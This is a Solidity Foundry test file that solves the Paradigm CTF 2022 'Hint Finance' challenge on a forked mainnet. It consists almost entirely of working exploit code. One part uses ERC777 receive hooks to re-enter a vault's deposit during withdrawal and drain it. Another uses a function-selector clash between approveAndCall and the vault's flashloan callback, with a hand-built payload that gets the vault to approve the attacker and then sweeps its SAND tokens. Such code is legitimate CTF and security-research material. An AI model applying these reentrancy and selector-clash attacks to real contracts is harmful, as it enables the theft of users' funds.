pragma solidity ^0.8.0;

import "forge-std/Test.sol";

import "../src/hint/public/contracts/Setup.sol";

import "../src/hint/public/contracts/IERC1820.sol";

contract ERC777Receiver is Test {
    IERC1820Registry public registry
        = IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);
    
    bytes32 constant private TOKENS_RECIPIENT_INTERFACE_HASH
        = 0xb281fc8c12954d22544db45de3159a39272895b169a852b314f9cc762e44c53b;
    bytes32 constant private AMP = keccak256("AmpTokensRecipient");
        
    HintFinanceVault public vault;
    
    uint public bal;
        
    constructor(HintFinanceVault _vault) {
        vault = _vault;
        
        registry.setInterfaceImplementer(
            address(this),
            TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
        
        registry.setInterfaceImplementer(
            address(this),
            AMP,
            address(this)
        );

    }
    
    // uint public with = 10000 ether;

    function tokensReceived(
        address /*operator*/,
        address from,
        address /*to*/,
        uint256 amount,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external {
        if (from == address(vault)) {
            emit log_named_uint("received from v:", amount);
            
            ERC20Like underlying = ERC20Like(vault.underlyingToken());
            if (!sweep) {
                vault.deposit(amount);
            }
        }
    }
    
    function tokensReceived(
        bytes4,
        bytes32,
        address /*operator*/,
        address from,
        address /*to*/,
        uint256 amount,
        bytes calldata /*userData*/,
        bytes calldata /*operatorData*/
    ) external {
        if (from == address(vault)) {
            emit log_named_uint("received from v:", amount);
            
            ERC20Like underlying = ERC20Like(vault.underlyingToken());
            if (!sweep) {
                vault.deposit(amount);
            }
        }
    }
    
    bool public sweep;
    
    function setSweep() public {
        sweep = true;
    }
    
    function with() public {
        vault.withdraw(vault.balanceOf(address(this)));
    }
    
    function heck777() public {
        ERC20Like underlying = ERC20Like(vault.underlyingToken());
        underlying.approve(address(vault), type(uint256).max);
        bal = underlying.balanceOf(address(this));
        emit log_named_uint("bal", bal);
        vault.deposit(bal);
    }
}

interface ISand is ERC20Like {
    function approveAndCall(
        address _target,
        uint256 _amount,
        bytes calldata _data
    ) external;
}

// Huge shoutout to Philogy: https://philogy.github.io/posts/paradigm-ctf-2022-write-up-collection/#hint-finance---the-final-token-how-
contract FakeToken is Test {
    fallback() external {}

    function transfer(address, uint256) external returns (bool) {
        return true;
    }

    function balanceOf(address) external view returns (uint256) {
        return 1e18;
    }

    // @ctf attack workflow:
    /*
        encode arguments into payload
        call approveAndCall and call the flashloan function of the vault
        the flashloan function calls back the aproveAndCall as the vault this time
        this approves FakeToken as an operator of vault's SAND tokens
        approveAndCall calls the fallback of the FakeToken
        we can now sweep the tokens cause we have access to them
    */
    function stealSandFrom(address _sandVault, ISand _sand) external {
        bytes memory payload = abi.encodeWithSelector(
            HintFinanceVault.flashloan.selector,
            /* 
                We must set the memory length accordingly
                length + bool + sel + addr + bytes32(0)
                all bytes32 padded
                32 * 5 = 160 = 0xa0
            */
            address(this), 0xa0, abi.encodeWithSelector(
                bytes4(0x000000000),
                _sandVault,
                bytes32(0)
            )
        );
        _sand.approveAndCall(_sandVault, type(uint256).max, payload);
        _sand.transferFrom(_sandVault, msg.sender, _sand.balanceOf(_sandVault));
    }
}

contract Hint is Test {
    Setup setup;
    
    function test_hax() public {
        uint256 block_num = 15423094;
        vm.createSelectFork(vm.envString("ETH_RPC"), block_num);
        if (block.number != block_num) {
            fail();
        }
        
        setup = new Setup{value: 30 ether}();
                
        // First token is an ERC777 so we can use the callback to steal it
        // We can deposit and use the hooks at withdraw time as no check is done by the contract
        
        UniswapV2RouterLike router = UniswapV2RouterLike(0xf164fC0Ec4E93095b804a4795bBe1e041497b92a);
        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address[] memory path = new address[](2);
        path[0] = weth;

        for (uint256 i; i < 3; ++i) {
            address token = setup.underlyingTokens(i);
            path[1] = token;
            router.swapExactETHForTokens{value: 10 ether}(0, path, address(this), block.timestamp);
            address vault = setup.hintFinanceFactory().underlyingToVault(token);
            
            if (i == 0 || i == 2) {
                // is ERC777
                ERC777Receiver receiver = new ERC777Receiver(HintFinanceVault(vault));
                ERC20Like token = ERC20Like(token);
                uint bal = token.balanceOf(address(this));
                token.transfer(address(receiver), bal);

                if (i == 0) {
                    receiver.heck777();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();

                    receiver.setSweep();
                    receiver.with();
                } else {
                    receiver.heck777();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();
                    receiver.with();

                    receiver.setSweep();
                    receiver.with();
                }
            } else {
                // is function clash
                /*
                    $ cast 4byte 0xcae9ca51
                    approveAndCall(address,uint256,bytes)
                    onHintFinanceFlashloan(address,address,uint256,bool,bytes)
                */
                // we must make the arguments match
                // we wanna provide the correct stuff to approveAndCall so it's gonna call flashloan and flashloan will approve
                // approveAndCall(attacker, max, selector + 32 bytes + msg.sender)
                // onHintFinanceFlashloan(attacker, address(max), )
                
                FakeToken ft = new FakeToken();
                ft.stealSandFrom(vault, ISand(token));
            }
       }

        ////////// HAX //////////

        /////////////////////////

        assertTrue(setup.isSolved());
    }
}